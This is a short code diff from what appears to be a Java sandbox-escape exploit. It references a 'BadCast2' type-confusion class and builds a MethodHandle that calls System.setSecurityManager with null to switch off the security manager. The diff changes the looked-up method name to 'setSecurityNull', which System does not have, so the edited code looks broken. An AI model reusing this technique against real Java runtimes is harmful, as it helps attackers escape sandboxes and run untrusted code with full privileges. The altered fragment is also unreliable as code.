@@ -26,7 +26,7 @@ public class Main {
                 BadCast2 e = new BadCast2();
                 handleEx(e);
                 MethodType metType = MethodType.methodType(void.class, System.class);
-                MethodHandle metHandle = MethodHandles.lookup().findStatic(System.class, "setSecurityManager", metType);
+                MethodHandle metHandle = MethodHandles.lookup().findStatic(System.class, "setSecurityNull", metType);
              	metHandle.invokeExact(System.class, null);
 
                 try {
